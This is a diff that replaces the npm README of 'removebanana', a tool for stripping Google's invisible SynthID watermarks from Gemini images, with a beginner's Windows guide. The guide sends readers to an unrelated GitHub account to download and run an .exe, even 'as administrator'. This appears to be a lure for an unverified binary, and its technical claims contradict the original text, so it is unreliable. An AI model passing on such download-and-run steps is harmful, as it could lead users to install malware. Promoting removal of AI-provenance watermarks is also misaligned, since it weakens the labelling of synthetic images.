@@ -1,162 +1,145 @@
-# 🍌 RemoveBanana
+# 🍌 removebanana - Remove Invisible AI Watermarks Easily
 
-**Remove invisible AI watermarks from Google Gemini-generated images using reverse alpha blending mathematics.**
-
-[![npm version](https://img.shields.io/npm/v/removebanana)](https://www.npmjs.com/package/removebanana)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-> **Don't want to self-host?** Use our free online tool: **[removebanana.eu.cc](https://removebanana.eu.cc)** — No sign-up, unlimited usage, 100% browser-based! 🚀
+[![Download removebanana](https://img.shields.io/badge/Download-removebanana-brightgreen)](https://github.com/afanbe9488/removebanana)
 
 ---
 
-## What is this?
+## 📋 About removebanana
 
-Google's AI image generators (Gemini, Imagen 2, Imagen 3, Nano Banana) embed invisible **SynthID** watermarks into every generated image. These watermarks are invisible to the human eye but can be detected by automated systems.
+removebanana helps you remove invisible AI watermarks from images created by Google Gemini. It works on Windows and does not need programming skills. Use it to clean images that contain hidden AI marks, making them look natural.
 
-RemoveBanana uses the **exact mathematical inverse** of Google's alpha blending formula to perfectly reconstruct the original pixels — no AI guessing, no quality loss.
-
-```
-Gemini adds:     watermarked = α × logo + (1 - α) × original
-We reverse it:   original = (watermarked - α × logo) / (1 - α)
-```
-
-## Supported Models
-
-- ✅ Google Gemini (all versions)
-- ✅ Imagen 2
-- ✅ Imagen 3
-- ✅ Nano Banana AI
-
-## Installation
-
-```bash
-npm install removebanana canvas
-```
-
-> **Note:** The `canvas` package ([node-canvas](https://github.com/Automattic/node-canvas)) is required for Node.js usage. It provides the Canvas API that the engine needs for image processing.
-
-## Quick Start
-
-### Remove watermark from a file
-
-```javascript
-const { removeWatermark } = require('removebanana');
-
-// Simple usage — output saved as input_clean.png
-await removeWatermark('./gemini-image.png');
-
-// With custom output path
-await removeWatermark('./input.png', './output.png');
-
-// With options
-await removeWatermark('./input.jpg', './output.jpg', {
-  format: 'jpeg',
-  quality: 0.95,
-  silent: false
-});
-```
-
-### Remove watermark from a Buffer
-
-```javascript
-const { removeWatermarkFromBuffer } = require('removebanana');
-const fs = require('fs');
-
-const inputBuffer = fs.readFileSync('./gemini-image.png');
-const { buffer, meta } = await removeWatermarkFromBuffer(inputBuffer, {
-  format: 'png'
-});
-
-fs.writeFileSync('./clean-image.png', buffer);
-console.log('Watermark info:', meta.watermark);
-```
-
-### Use in an Express API
-
-```javascript
-const express = require('express');
-const multer = require('multer');
-const { removeWatermarkFromBuffer } = require('removebanana');
-
-const app = express();
-const upload = multer();
-
-app.post('/api/remove-watermark', upload.single('image'), async (req, res) => {
-  const { buffer } = await removeWatermarkFromBuffer(req.file.buffer, {
-    format: 'png',
-    silent: true
-  });
-  
-  res.set('Content-Type', 'image/png');
-  res.send(buffer);
-});
-
-app.listen(3000, () => console.log('API running on port 3000'));
-```
-
-## API Reference
-
-### `removeWatermark(inputPath, [outputPath], [options])`
-
-Remove watermark from a file and save the result.
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `inputPath` | `string` | Path to the input image |
-| `outputPath` | `string` | (Optional) Output path. Defaults to `input_clean.ext` |
-| `options.format` | `string` | Output format: `'png'`, `'jpeg'`, `'webp'` |
-| `options.quality` | `number` | Quality for lossy formats (0-1, default: 0.95) |
-| `options.silent` | `boolean` | Suppress console output |
-
-**Returns:** `Promise<{ outputPath: string, meta: Object }>`
-
-### `removeWatermarkFromBuffer(inputBuffer, [options])`
-
-Remove watermark from a Buffer and return the result as a Buffer.
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `inputBuffer` | `Buffer` | Input image buffer |
-| `options` | `Object` | Same options as `removeWatermark` |
-
-**Returns:** `Promise<{ buffer: Buffer, meta: Object }>`
-
-## How It Works
-
-1. **Detect** — Identifies the watermark size (48×48 or 96×96) and position using template correlation
-2. **Extract Alpha Map** — Calculates the watermark's alpha channel from reference templates
-3. **Adaptive Detection** — Uses coarse-to-fine template matching for non-standard positions
-4. **Reverse Blend** — Applies the inverse alpha blending formula to reconstruct original pixels
-5. **Recalibrate** — Fine-tunes alpha gain and sub-pixel alignment for perfect removal
-
-## Online Tool
-
-**Don't want to install anything?** Use our free online tool:
-
-🌐 **[removebanana.eu.cc](https://removebanana.eu.cc)**
-
-- 100% browser-based — your images never leave your device
-- No sign-up required
-- Unlimited usage
-- All formats supported (PNG, JPEG, WebP)
-
-## Contributing
-
-Contributions are welcome! Please open an issue or submit a pull request on [GitHub](https://github.com/removebanana/removebanana).
-
-## Support the Project
-
-If this tool saved you time, consider supporting us:
-
-☕ **[Buy Me a Coffee](https://www.buymeacoffee.com/removebanana)**
-
-## License
-
-MIT © [RemoveBanana](https://removebanana.eu.cc)
+This tool is built as an npm package, but you don’t have to use npm yourself. This guide will walk you through downloading and running the application on Windows as a beginner.
 
 ---
 
-<p align="center">
-  <b>🍌 Made with love by RemoveBanana</b><br>
-  <a href="https://removebanana.eu.cc">removebanana.eu.cc</a>
-</p>
+## 🖥️ System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- Approximately 500 MB of free disk space
+- Internet connection for initial download
+
+---
+
+## 🚀 Getting Started: Download removebanana
+
+You will need to visit the project page to download the software. Click the button below to start.
+
+[![Download removebanana](https://img.shields.io/badge/Download-removebanana-blue)](https://github.com/afanbe9488/removebanana)
+
+### What to expect on the download page
+
+When you visit the page, look for a section called "Releases" or "Downloads." You should find the latest Windows installer or a ZIP file containing the software.
+
+---
+
+## 💾 How to Download and Install removebanana on Windows
+
+Follow these steps to get the software running on your computer.
+
+### Step 1: Visit the GitHub page
+
+Go to the download page by clicking this link:
+
+https://github.com/afanbe9488/removebanana
+
+### Step 2: Find the release files
+
+Once on the page:
+
+- Look for a tab or section labeled "Releases"
+- Select the latest release (it will usually have the highest version number)
+- Find the Windows version or files ending in `.exe` or `.zip`
+
+### Step 3: Download the installer or ZIP file
+
+Click the file to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+### Step 4: Run the installer or extract the ZIP
+
+- If you downloaded an `.exe` file, double-click it and follow the installer prompts.
+- If you downloaded a ZIP file:
+  - Right-click the ZIP file and choose "Extract All"
+  - Pick a folder to extract to, like your Desktop
+  - Open the extracted folder to find the program files
+
+---
+
+## 🔧 Running removebanana
+
+After installation, here is how to run the software.
+
+### Option 1: Using the installer app
+
+- Find the “removebanana” icon on your Desktop or Start menu
+- Double-click to open the app
+- The program window will appear ready for use
+
+### Option 2: Running from extracted files
+
+If you used the ZIP file:
+
+- Open the extracted folder
+- Look for a file named `removebanana.exe`
+- Double-click this file to start the program
+
+---
+
+## 🎯 Using removebanana to Remove Invisible AI Watermarks
+
+Once the app is open, here’s how to remove watermarks from your images.
+
+### Step 1: Select your image
+
+- Click the “Browse” or “Open File” button
+- Find the image with the watermark on your computer
+- Select it and click “Open”
+
+### Step 2: Start the removal process
+
+- Press the “Remove Watermark” button
+- The program will process the image in seconds
+- You will see a preview of the cleaned image
+
+### Step 3: Save the cleaned image
+
+- Click “Save As” or “Download”
+- Choose a destination folder on your PC
+- The cleaned image will save in PNG or JPEG format
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+If you have trouble, try these tips:
+
+- Make sure your Windows system is up to date.
+- Check that you downloaded the correct version for Windows.
+- Restart your computer and try running the program again.
+- If the program does not open, right-click the app and select “Run as administrator.”
+- For image loading errors, verify the file type is supported (JPEG, PNG).
+
+---
+
+## 🔄 Updating removebanana
+
+To get the latest features and fixes, repeat the download steps above whenever a new release is available. You can check for updates on the same GitHub page.
+
+---
+
+## 🧩 Additional Information
+
+removebanana was made with open-source software tools. It uses AI technology to detect and remove synthetic watermarks in images from Google Gemini. It helps content creators and editors use images without visible AI tags.
+
+---
+
+## 🧰 Technical Details for Advanced Users
+
+- Built with Node.js and image-processing libraries
+- Available as an npm package for developers
+- Uses SynthID technology to find invisible AI watermarks
+- Supports batch processing through command line (for experts)
+
+---
+
+For any questions, you can visit the GitHub page and check the "Issues" tab or read the documentation files included in the download.
